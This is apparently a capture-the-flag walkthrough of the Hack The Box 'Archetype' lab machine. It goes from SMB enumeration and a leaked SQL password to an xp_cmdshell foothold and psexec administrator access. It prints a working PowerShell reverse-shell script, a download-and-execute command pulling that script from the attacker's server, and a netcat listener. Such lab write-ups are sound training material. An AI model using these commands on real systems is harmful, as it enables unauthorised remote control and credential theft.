---

title: "Archetype"
date: 2022-02-15 01:09:33 +0300
author: oste
image: /assets/img/Posts/Archetype.png
categories: [HTB, Starting Point, Tier 2]
tags:
  [
    mssqlclient.py,
    windows,
    xp_cmdshell,
    winpeas,
    DTSCONFIG,
    ConsoleHost_history.txt,
    psexec.py,
    impacket,
  ]
---

## Which TCP port is hosting a database server?

Performing a simple nmap scan, we can determine what ports are open and what services they are running.

```bash
➜  kali nmap -sC -sV -p- -T4 -Pn 10.129.92.164
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-15 10:15 EST
Nmap scan report for 10.129.92.164 (10.129.92.164)
Host is up (0.24s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-02-15T15:14:20
|_Not valid after:  2052-02-15T15:14:20
|_ssl-date: 2022-02-15T15:23:38+00:00; 0s from scanner time.
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info:
|   10.129.92.164:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-02-15T07:23:24-08:00
|_clock-skew: mean: 1h36m00s, deviation: 3h34m40s, median: 0s
| smb2-time:
|   date: 2022-02-15T15:23:28
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 518.09 seconds
```

`1433`

## What is the name of the non-Administrative share available over SMB?

```bash
➜  kali smbclient -L \\\\10.129.92.164\\

Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

`backups`

## What is the password identified in the file on the SMB share?

```bash
➜  smbclient \\\\10.129.92.164\\backups

Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2616354 blocks available
smb: \> mget prod.dtsConfig
Get file prod.dtsConfig? yes
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> exit
➜  kali cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>#                                                                                                         ➜
```

> A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages. _Source: [fileinfo](https://fileinfo.com/extension/dtsconfig#:~:text=A%20DTSCONFIG%20file%20is%20an,properties%20to%20configure%20SSIS%20packages.)_

`M3g4c0rp123`

## What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

[Impacket/mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)

`mssqlclient.py`

## What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

According to [Microsoft](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15), xp_cmdshell Spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text.

`xp_cmdshell`

## What script can be used in order to search possible paths to escalate privileges on Windows hosts?

Winpeas is a script which can automate a big part of the enumeration process in the target system. You can find more information for enumerating Windows system
for Privilege Escalation paths in the HTB academy module [Windows Privilege Escalation](https://academy.hackthebox.eu/course/preview/windows-privilege-escalation). You can download it at: [carlospolop/PEASS-ng/winPEAS/](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

`winpeas`

## What file contains the administrator's password?

After gaining a shell on the target, i run winpeas and came across powershell history as a file of interest.

The text file `“ConsoleHost_history.txt”` located at: `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\` Holds a history of recent Windows PowerShell commands executed. Unless changed by a user with the `“Set-PSReadlineOption –HistorySavePath”` option.

![image](https://user-images.githubusercontent.com/58165365/154124751-97a5eb42-855f-4860-9c12-a435b84d1660.png)

Cating its contents, reveals the Administrators password

`ConsoleHost_history.txt`

## Submit user flag

We can use `mssqclient.py` to do connect to the database and gain shell access using `xp_cmdshell`.

```bash
# Cheat-Sheet
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@tun0 -windows-auth
SELECT IS_SRVROLEMEMBER ('sysadmin')
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"
```

```bash
➜  mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.92.164 -windows-auth
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL> xp_cmdshell
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')

-----------

          1

SQL> EXEC sp_configure 'Show Advanced Options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
SQL> sp_configure;
name                                      minimum       maximum   config_value     run_value

-----------------------------------   -----------   -----------   ------------   -----------

access check cache bucket count                 0         65536              0             0

access check cache quota                        0    2147483647              0             0

Ad Hoc Distributed Queries                      0             1              0             0

affinity I/O mask                     -2147483648    2147483647              0             0

affinity mask                         -2147483648    2147483647              0             0

affinity64 I/O mask                   -2147483648    2147483647              0             0

affinity64 mask                       -2147483648    2147483647              0             0

Agent XPs                                       0             1              0             0

allow polybase export                           0             1              0             0

allow updates                                   0             1              0             0

automatic soft-NUMA disabled                    0             1              0             0

backup checksum default                         0             1              0             0

backup compression default                      0             1              0             0

blocked process threshold (s)                   0         86400              0             0

c2 audit mode                                   0             1              0             0

clr enabled                                     0             1              0             0

clr strict security                             0             1              1             1

contained database authentication               0             1              0             0

cost threshold for parallelism                  0         32767              5             5

cross db ownership chaining                     0             1              0             0

cursor threshold                               -1    2147483647             -1            -1

Database Mail XPs                               0             1              0             0

default full-text language                      0    2147483647           1033          1033

default language                                0          9999              0             0

default trace enabled                           0             1              1             1

disallow results from triggers                  0             1              0             0

external scripts enabled                        0             1              0             0

filestream access level                         0             2              0             0

fill factor (%)                                 0           100              0             0

ft crawl bandwidth (max)                        0         32767            100           100

ft crawl bandwidth (min)                        0         32767              0             0

ft notify bandwidth (max)                       0         32767            100           100

ft notify bandwidth (min)                       0         32767              0             0

hadoop connectivity                             0             7              0             0

index create memory (KB)                      704    2147483647              0             0

in-doubt xact resolution                        0             2              0             0

lightweight pooling                             0             1              0             0

locks                                        5000    2147483647              0             0

max degree of parallelism                       0         32767              0             0

max full-text crawl range                       0           256              4             4

max server memory (MB)                        128    2147483647     2147483647    2147483647

max text repl size (B)                         -1    2147483647          65536         65536

max worker threads                            128         65535              0             0

media retention                                 0           365              0             0

min memory per query (KB)                     512    2147483647           1024          1024

min server memory (MB)                          0    2147483647              0            16

nested triggers                                 0             1              1             1

network packet size (B)                       512         32767           4096          4096

Ole Automation Procedures                       0             1              0             0

open objects                                    0    2147483647              0             0

optimize for ad hoc workloads                   0             1              0             0

PH timeout (s)                                  1          3600             60            60

polybase network encryption                     0             1              1             1

precompute rank                                 0             1              0             0

priority boost                                  0             1              0             0

query governor cost limit                       0    2147483647              0             0

query wait (s)                                 -1    2147483647             -1            -1

recovery interval (min)                         0         32767              0             0

remote access                                   0             1              1             1

remote admin connections                        0             1              0             0

remote data archive                             0             1              0             0

remote login timeout (s)                        0    2147483647             10            10

remote proc trans                               0             1              0             0

remote query timeout (s)                        0    2147483647            600           600

Replication XPs                                 0             1              0             0

scan for startup procs                          0             1              0             0

server trigger recursion                        0             1              1             1

set working set size                            0             1              0             0

show advanced options                           0             1              1             1

SMO and DMO XPs                                 0             1              1             1

transform noise words                           0             1              0             0

two digit year cutoff                        1753          9999           2049          2049

user connections                                0         32767              0             0

user options                                    0         32767              0             0

xp_cmdshell                                     0             1              0             0

SQL> EXEC sp_configure 'xp_cmdshell', 1
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
SQL> xp_cmdshell "whoami"
output

--------------------------------------------------------------------------------

archetype\sql_svc

NULL
```

In order to get a shell, we can craft a powershell reverse shell script which we can upload to the target.

```
$client = New-Object System.Net.Sockets.TCPClient('tun0',4433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Save it as shell.ps1 and serve it

```bash
➜  serve 8080
Serving files from /home/kali/Desktop/archetype
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.92.164 - - [15/Feb/2022 12:02:15] "GET /shell.ps1 HTTP/1.1" 200 -
```

On the `xp_shell` , execute:

```
SQL> EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://10.10.15.77:8080/shell.ps1") | powershell -noprofile'
```

Once you get a shell, you can easily find the user flag in `sql_svc`'s home directory.

```powershell
➜  nc -lnvp 4433
listening on [any] 4433 ...
connect to [10.10.15.77] from (UNKNOWN) [10.129.92.164] 49680
pwd

Path
----
C:\Windows\system32


PS C:\Windows\system32> cd ..\..\Users
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/19/2020  10:39 PM                Administrator
d-r---        1/19/2020  10:39 PM                Public
d-----        1/20/2020   5:01 AM                sql_svc


PS C:\Users> cd sql_svc
PS C:\Users\sql_svc> cd Desktop
PS C:\Users\sql_svc\Desktop> dir


    Directory: C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2020   6:37 AM             32 user.txt


PS C:\Users\sql_svc\Desktop> type user.txt
3e7b****************************c21a3
PS C:\Users\sql_svc\Desktop>
```

## Submit root flag

```bash
➜  psexec.py administrator@10.129.92.164
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.92.164.....
[*] Found writable share ADMIN$
[*] Uploading file APKjGCXx.exe
[*] Opening SVCManager on 10.129.92.164.....
[*] Creating service jpio on 10.129.92.164.....
[*] Starting service jpio.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd ..\..\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
b91cc********************b848528
C:\Users\Administrator\Desktop>
```

# Resources

- [powershell-command-history-forensics](https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics)
- [winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/tag/20220214)
